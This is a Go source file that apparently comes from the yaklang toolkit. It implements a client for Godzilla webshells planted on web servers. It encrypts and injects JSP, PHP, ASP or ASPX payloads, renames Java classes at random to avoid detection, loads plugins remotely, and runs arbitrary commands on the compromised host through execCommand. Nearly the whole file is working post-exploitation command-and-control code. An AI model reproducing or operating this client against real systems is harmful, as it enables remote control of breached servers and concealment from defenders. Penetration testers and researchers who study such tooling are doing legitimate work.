package wsm

import (
	"bytes"
	"context"
	"encoding/hex"
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/utils/lowhttp/poc"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/wsm/payloads/godzilla"
	"github.com/yaklang/yaklang/common/yak"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"net/http"
	"strings"
)

type Godzilla struct {
	Url string
	//
	// 连接参数
	Pass string
	// 密钥
	SecretKey []byte
	// shell 类型
	ShellScript string
	// 加密模式
	EncMode string
	Proxy   string
	// 自定义 header 头
	Headers map[string]string
	// request 开头的干扰字符
	ReqLeft string
	// request 结尾的干扰字符
	ReqRight string

	req             *http.Request
	dynamicFuncName map[string]string

	PacketScriptContent  string
	PayloadScriptContent string

	customEchoEncoder   codecFunc
	customEchoDecoder   codecFunc
	customPacketEncoder codecFunc
}

func NewGodzilla(ys *ypb.WebShell) (*Godzilla, error) {
	gs := &Godzilla{
		Url:             ys.GetUrl(),
		Pass:            ys.GetPass(),
		SecretKey:       secretKey(ys.GetSecretKey()),
		ShellScript:     ys.GetShellScript(),
		EncMode:         ys.GetEncMode(),
		Proxy:           ys.Proxy,
		Headers:         make(map[string]string, 2),
		dynamicFuncName: make(map[string]string, 2),
	}

	gs.setContentType()
	//if ys.GetHeaders() != nil {
	//	gs.Headers = ys.GetHeaders()
	//}
	return gs, nil
}

func (g *Godzilla) SetPayloadScriptContent(content string) {
	g.PayloadScriptContent = content
}

func (g *Godzilla) SetPacketScriptContent(content string) {
	g.PacketScriptContent = content

}

func (g *Godzilla) clientRequestEncode(raw []byte) ([]byte, error) {
	enRaw, err := g.enCryption(raw)
	if err != nil {
		return nil, err
	}
	if len(g.PacketScriptContent) == 0 {
		return enRaw, nil
	}

	if g.customPacketEncoder != nil {
		return g.customPacketEncoder(enRaw)
	}
	return g.ClientRequestEncode(enRaw)
}

func (g *Godzilla) ClientRequestEncode(raw []byte) ([]byte, error) {
	if len(g.PacketScriptContent) == 0 {
		return nil, utils.Errorf("empty packet script content")
	}

	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PacketScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPacketEncoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytes(result)

	return rspBytes, nil
}

func (g *Godzilla) ServerResponseDecode(raw []byte) ([]byte, error) {
	//TODO implement me
	panic("implement me")
}

func (g *Godzilla) echoResultEncode(raw []byte) ([]byte, error) {
	if g.customEchoEncoder != nil {
		return g.customEchoEncoder(raw)
	}
	return g.EchoResultEncodeFormYak(raw)
}

func (g *Godzilla) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
	if len(g.PayloadScriptContent) == 0 {
		return []byte(""), nil
	}

	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PayloadScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "EchoResultEncodeFormYak", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadEncoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "EchoResultEncodeFormYak", err)
	}
	rspBytes := utils.InterfaceToBytes(result)

	return rspBytes, nil
}

func (g *Godzilla) echoResultDecode(raw []byte) ([]byte, error) {
	if g.customEchoDecoder != nil {
		return g.customEchoDecoder(raw)
	}
	return g.EchoResultDecodeFormYak(raw)
}

func (g *Godzilla) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
	if len(g.PayloadScriptContent) == 0 {
		return g.deCryption(raw)
	}
	engine, err := yak.NewScriptEngine(1000).ExecuteEx(g.PayloadScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadDecoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytesSlice(result)[0]

	return rspBytes, nil
}

func (g *Godzilla) EchoResultEncodeFormGo(en codecFunc) {
	g.customEchoEncoder = en
}

func (g *Godzilla) EchoResultDecodeFormGo(de codecFunc) {
	g.customEchoDecoder = de
}

func (g *Godzilla) ClientRequestEncodeFormGo(en codecFunc) {
	g.customPacketEncoder = en
}

func (g *Godzilla) setDefaultParams() map[string]string {
	// TODO 添加所有参数
	g.dynamicFuncName["test"] = "test"
	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo"
	g.dynamicFuncName["execCommand"] = "execCommand"
	return g.dynamicFuncName
}

func (g *Godzilla) setContentType() {
	switch g.EncMode {
	case ypb.EncMode_Base64.String():
		g.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.EncMode_Raw.String():
	default:
		panic("shell script type error [JSP/JSPX/ASP/ASPX/PHP]")
	}
}

// 原生的加密方式
func (g *Godzilla) enCryption(binCode []byte) ([]byte, error) {
	enPayload, err := godzilla.Encryption(binCode, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, true)
	if err != nil {
		return nil, err
	}
	return enPayload, nil
}

func (g *Godzilla) deCryption(raw []byte) ([]byte, error) {
	deBody, err := godzilla.Decryption(raw, g.SecretKey, g.Pass, g.EncMode, g.ShellScript)
	if err != nil {
		return nil, err
	}
	return deBody, nil
}

func (g *Godzilla) getPayload(binCode string) ([]byte, error) {
	var payload []byte
	var err error
	switch g.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		payload, err = hex.DecodeString(godzilla.JavaClassPayload)
		if err != nil {
			return nil, err
		}
		//payload, err = g.dynamicUpdateClassName("payloadv4", payload)
		payload, err = g.dynamicUpdateClassName("payload", payload)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_PHP.String():
		payload, err = hex.DecodeString(godzilla.PhpCodePayload)
		if err != nil {
			return nil, err
		}
		r1 := utils.RandStringBytes(50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	case ypb.ShellScript_ASPX.String():
		//payload, err = hex.DecodeString(godzilla.CsharpDllPayload)
		//if err != nil {
		//	return nil, err
		//}
		payload = payloads.CshrapPayload
	case ypb.ShellScript_ASP.String():
		payload, err = hex.DecodeString(godzilla.AspCodePayload)
		if err != nil {
			return nil, err
		}
		r1 := utils.RandStringBytes(50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	}
	return payload, nil
}

// 修改并且记录修改前后的对应关系
func (g *Godzilla) dynamicUpdateClassName(oldName string, classContent []byte) ([]byte, error) {
	clsObj, err := javaclassparser.Parse(classContent)
	if err != nil {
		return nil, err
	}
	fakeSourceFileName := utils.RandNumberStringBytes(8)
	err = clsObj.SetSourceFileName(fakeSourceFileName)
	if err != nil {
		return nil, err
	}
	// 原始的 class 就叫 payloav4,代表哥斯拉 v4 版本
	g.dynamicFuncName[oldName+".java"] = fakeSourceFileName + ".java"

	// 替换 execCommand() 函数为 execCommand2() 函数, 这里只是暂时一下替换函数名的功能
	err = clsObj.SetMethodName("getBasicsInfo", "getBasicsInfo2")
	if err != nil {
		return nil, err
	}
	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo2"

	newClassName := payloads.RandomClassName()
	//newClassName := "go0pzzz"
	// 随机替换类名
	err = clsObj.SetClassName(newClassName)
	if err != nil {
		return nil, err
	}
	log.Info(fmt.Sprintf("%s ----->>>>> %s", oldName, newClassName))
	g.dynamicFuncName[oldName] = newClassName
	de := hex.EncodeToString(clsObj.Bytes())
	log.Infof("base64 encode class: %s", de)
	return clsObj.Bytes(), nil
}

func (g *Godzilla) post(data []byte) ([]byte, error) {
	resp, req, err := poc.DoPOST(
		g.Url,
		poc.WithProxy(g.Proxy),
		poc.WithAppendHeaders(g.Headers),
		poc.WithReplaceHttpPacketBody(data, false),
		poc.WithSession("godzilla"),
	)
	if err != nil {
		return nil, utils.Errorf("http request error: %v", err)
	}

	_, raw := lowhttp.SplitHTTPHeadersAndBodyFromPacket(resp.RawPacket)

	if len(raw) == 0 && g.req != nil {
		return nil, utils.Errorf("empty response")
	}
	g.req = req
	raw = bytes.TrimSuffix(raw, []byte("\r\n\r\n"))
	return raw, nil
}

func (g *Godzilla) sendPayload(data []byte) ([]byte, error) {
	enData, err := g.clientRequestEncode(data)
	if err != nil {
		return nil, err
	}
	body, err := g.post(enData)
	if err != nil {
		return nil, err
	}
	if len(body) == 0 {
		return nil, utils.Error("返回数据为空")
	}
	deBody, err := g.deCryption(body)
	if err != nil {
		return nil, err
	}
	log.Infof("默认解密后: %s", string(deBody))
	return g.echoResultDecode(deBody)
}

// EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
func (g *Godzilla) EvalFunc(className, funcName string, parameter *godzilla.Parameter) ([]byte, error) {
	// 填充随机长度
	//r1, r2 := utils.RandSampleInRange(10, 20), utils.RandSampleInRange(10, 20)
	//parameter.AddString(r1, r2)
	if className != "" && len(strings.Trim(className, " ")) > 0 {
		switch g.ShellScript {
		case ypb.ShellScript_JSPX.String():
			fallthrough
		case ypb.ShellScript_JSP.String():
			parameter.AddString("evalClassName", g.dynamicFuncName[className])
		case ypb.ShellScript_ASPX.String():
			parameter.AddString("evalClassName", className)
		case ypb.ShellScript_ASP.String():
			fallthrough
		case ypb.ShellScript_PHP.String():
			parameter.AddString("codeName", className)

		}
	}
	parameter.AddString("methodName", funcName)
	data := parameter.Serialize()
	log.Infof("send data: %q", string(data))

	//enData, err := g.enCryption(data)
	//enData, err := g.customEncoder(data)

	return g.sendPayload(data)
}

func newParameter() *godzilla.Parameter {
	return godzilla.NewParameter()
}

// Include 远程 shell 加载插件
func (g *Godzilla) Include(codeName string, binCode []byte) (bool, error) {
	parameter := newParameter()
	switch g.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		//binCode, err := g.dynamicUpdateClassName(codeName, binCode)
		//if err != nil {
		//	return false, err
		//}
		g.dynamicFuncName[codeName] = codeName
		codeName = g.dynamicFuncName[codeName]
		if codeName != "" {
			parameter.AddString("codeName", codeName)
			parameter.AddBytes("binCode", binCode)
			result, err := g.EvalFunc("", "include", parameter)
			if err != nil {
				return false, err
			}
			resultString := strings.Trim(string(result), " ")
			if resultString == "ok" {
				return true, nil
			} else {
				return false, utils.Error(resultString)
			}
		} else {
			return false, utils.Errorf("类: %s 映射不存在", codeName)
		}
	case ypb.ShellScript_ASPX.String():
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "include", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" || resultString == "ko" {
			return true, nil
		} else {
			return false, utils.Error(resultString)
		}
	case ypb.ShellScript_ASP.String():
	case ypb.ShellScript_PHP.String():
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "includeCode", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true, nil
		} else {
			return false, utils.Error(resultString)
		}
	}
	return false, nil
}

func (g *Godzilla) InjectPayload() error {
	payload, err := g.getPayload("")
	params := make(map[string]string, 2)
	value, _ := g.echoResultEncode([]byte(""))
	if len(value) != 0 {
		switch g.ShellScript {
		case ypb.ShellScript_ASPX.String():
			// todo
			params["customEncoderFromAssembly"] = string(value)
			payload, err = behinder.GetRawAssembly(hex.EncodeToString(payload), params)
			if err != nil {
				return err
			}
		case ypb.ShellScript_JSP.String(), ypb.ShellScript_JSPX.String():
			params["customEncoderFromClass"] = string(value)
		case ypb.ShellScript_PHP.String(), ypb.ShellScript_ASP.String():
			params["customEncoderFromText"] = string(value)
		}
	}

	if err != nil {
		return err
	}
	enc, err := godzilla.Encryption(payload, g.SecretKey, g.Pass, g.EncMode, g.ShellScript, false)

	if err != nil {
		return err
	}
	_, err = g.post(enc)
	if err != nil {
		return err
	}
	return nil
}

func (g *Godzilla) InjectPayloadIfNoCookie() error {
	if g.req == nil {
		err := g.InjectPayload()
		if err != nil {
			return err
		}
	}
	return nil
}

// 销毁一个会话中的全部数据,可以清除缓存文件夹中的 sess_PHPSESSID 文件
func (g *Godzilla) close() (bool, error) {
	parameter := newParameter()
	res, err := g.EvalFunc("", "close", parameter)
	if err != nil {
		return false, err
	}
	result := string(res)
	if "ok" == result {
		return true, nil
	} else {
		return false, utils.Error(result)
	}
}

//func (g *Godzilla) Encoder(f func(raw []byte) ([]byte, error)) ([]byte, error) {
//	g.CustomEncoder = encoderFunc
//	return nil, nil
//}

func (g *Godzilla) String() string {
	return fmt.Sprintf(
		"Url: %s, SecretKey: %x, ShellScript: %s, Proxy: %s, Headers: %v",
		g.Url,
		g.SecretKey,
		g.ShellScript,
		g.Proxy,
		g.Headers,
	)
}

func (g *Godzilla) GenWebShell() string {
	return ""
}

func (g *Godzilla) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return false, nil
	}
	parameter := newParameter()
	result, err := g.EvalFunc("", "test", parameter)
	if err != nil {
		return false, err
	}
	if strings.Trim(string(result), " ") == "ok" {
		return true, nil
	} else {
		return false, utils.Error(result)
	}
}

func (g *Godzilla) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	parameter := newParameter()
	basicsInfo, err := g.EvalFunc("", "getBasicsInfo", parameter)
	if err != nil {
		return nil, err
	}
	return parseBaseInfoToJson(basicsInfo), nil
}

func (g *Godzilla) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}
	parameter := newParameter()
	parameter.AddString("cmdLine", cmd)
	return g.EvalFunc("", "execCommand", parameter)
}

func (g *Godzilla) FileManagement() {

}
